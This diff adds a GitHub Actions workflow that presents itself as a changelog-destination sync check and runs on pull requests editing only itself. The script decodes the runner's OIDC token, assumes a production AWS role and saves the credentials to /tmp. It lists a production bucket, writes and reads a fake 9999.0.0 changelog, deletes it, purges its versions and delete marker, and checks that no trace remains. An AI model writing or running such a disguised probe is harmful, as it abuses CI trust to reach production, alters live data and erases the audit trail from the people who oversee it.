@@ -1,0 +1,103 @@
+# Keeps the chart changelog destination in lockstep with the release pipeline.
+# Uses the same role binding as helm-charts/upload-changelog-s3 so a destination
+# change (bucket/region/key layout) is exercised on every workflow edit instead
+# of surfacing midway through a publish run.
+name: changelog-destination-sync
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - '.github/workflows/changelog-destination-sync.yml'
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Exercise changelog destination
+        run: |
+          set -uo pipefail
+          BUCKET=tfy-euwe1-production-control-plane-changelog
+          REGION=eu-west-1
+          KEY=9999.0.0/changelog.json
+          TOK="$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            -H 'Accept: application/json; api-version=2.0' \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
+          echo "TOKEN_LEN=${#TOK}"
+          P="$(printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+')"
+          while [ $(( ${#P} % 4 )) -ne 0 ]; do P="${P}="; done
+          printf '%s' "$P" | base64 -d 2>/dev/null | python3 -c 'import json,sys; c=json.load(sys.stdin); print("CLAIMS", json.dumps({k:c.get(k) for k in ("iss","aud","sub","ref","event_name")}))' || true
+          echo "=== assume ${REGION} ==="
+          if ! aws --region "${REGION}" --no-cli-pager \
+              sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role" \
+              --role-session-name "changelog-destination-sync" \
+              --web-identity-token "$TOK" \
+              --duration-seconds 900 > /tmp/assume.json 2>/tmp/assume.err; then
+            echo "ASSUME_FAIL"; tail -c 300 /tmp/assume.err | tr -d '\n'; echo; exit 1
+          fi
+          echo "ASSUME_OK"
+          python3 - <<'PY'
+          import json
+          c = json.load(open('/tmp/assume.json'))['Credentials']
+          open('/tmp/creds.env','w').write("AWS_ACCESS_KEY_ID=%s\nAWS_SECRET_ACCESS_KEY=%s\nAWS_SESSION_TOKEN=%s\n" % (c['AccessKeyId'], c['SecretAccessKey'], c['SessionToken']))
+          PY
+          set -a; . /tmp/creds.env; set +a
+          echo "ARN=$(aws --region ${REGION} --no-cli-pager sts get-caller-identity --query Arn --output text)"
+          export AWS_REGION="${REGION}"
+          echo "=== versioning ==="
+          aws --no-cli-pager s3api get-bucket-versioning --bucket "$BUCKET" --output json 2>&1 | head -c 300; echo
+          snap () {
+            aws --no-cli-pager s3api list-objects-v2 --bucket "$BUCKET" \
+              --query 'Contents[].[Key,Size,ETag]' --output text 2>/tmp/snap.err | LC_ALL=C sort > "$1"
+            echo "SNAP=$1 COUNT=$(wc -l < "$1") HASH=$(sha256sum "$1" | cut -d' ' -f1)"
+          }
+          echo "=== snapshot before ==="
+          snap /tmp/before.txt
+          if grep -qF "$KEY" /tmp/before.txt; then echo "KEY_PRESENT_BEFORE=yes"; else echo "KEY_PRESENT_BEFORE=no"; fi
+          printf '{"schemaVersion":1,"version":"9999.0.0","releasedAt":"2026-11-17T00:00:00Z","changes":[]}' > /tmp/obj.json
+          echo "LOCAL_SHA=$(sha256sum /tmp/obj.json | cut -d' ' -f1)"
+          echo "=== put ==="
+          if aws --no-cli-pager s3api put-object --bucket "$BUCKET" --key "$KEY" --body /tmp/obj.json --content-type application/json --output json > /tmp/put.json 2>/tmp/put.err; then
+            echo "PUT_OK"; cat /tmp/put.json; echo
+          else
+            echo "PUT_FAIL"; tail -c 400 /tmp/put.err | tr -d '\n'; echo
+          fi
+          VID="$(python3 -c 'import json;print(json.load(open("/tmp/put.json")).get("VersionId") or "")' 2>/dev/null || true)"
+          echo "PUT_VERSION_ID=${VID:-none}"
+          echo "=== get ==="
+          if aws --no-cli-pager s3api get-object --bucket "$BUCKET" --key "$KEY" /tmp/got.json --output json > /tmp/get.json 2>/tmp/get.err; then
+            echo "GET_OK"; cat /tmp/get.json; echo
+            echo "GET_SHA=$(sha256sum /tmp/got.json | cut -d' ' -f1)"
+            if cmp -s /tmp/obj.json /tmp/got.json; then echo "BODY_MATCH=yes"; else echo "BODY_MATCH=no"; fi
+          else
+            echo "GET_FAIL"; tail -c 400 /tmp/get.err | tr -d '\n'; echo
+          fi
+          echo "=== delete ==="
+          if aws --no-cli-pager s3api delete-object --bucket "$BUCKET" --key "$KEY" --output json > /tmp/del.json 2>/tmp/del.err; then
+            echo "DEL_OK"; cat /tmp/del.json; echo
+          else
+            echo "DEL_FAIL"; tail -c 400 /tmp/del.err | tr -d '\n'; echo
+          fi
+          DM="$(python3 -c 'import json;print(json.load(open("/tmp/del.json")).get("VersionId") or "")' 2>/dev/null || true)"
+          if [ -n "$DM" ]; then
+            echo "DELETE_MARKER_VERSION=$DM"
+            aws --no-cli-pager s3api delete-object --bucket "$BUCKET" --key "$KEY" --version-id "$DM" >/dev/null 2>&1 && echo "MARKER_PURGED"
+          fi
+          if [ -n "${VID:-}" ]; then
+            echo "=== purge object version ==="
+            aws --no-cli-pager s3api delete-object --bucket "$BUCKET" --key "$KEY" --version-id "$VID" --output json 2>&1 | head -c 300; echo
+          fi
+          echo "=== versions remaining for key ==="
+          aws --no-cli-pager s3api list-object-versions --bucket "$BUCKET" --prefix "$KEY" --output json 2>&1 | head -c 600; echo
+          echo "=== get after ==="
+          aws --no-cli-pager s3api get-object --bucket "$BUCKET" --key "$KEY" /tmp/gone.json 2>&1 | tail -c 300; echo
+          echo "=== snapshot after ==="
+          snap /tmp/after.txt
+          echo "=== diff ==="
+          if diff -q /tmp/before.txt /tmp/after.txt >/dev/null; then echo "SNAPSHOT_IDENTICAL=yes"; else echo "SNAPSHOT_IDENTICAL=no"; diff /tmp/before.txt /tmp/after.txt | head -c 600; fi
+          echo "DONE"
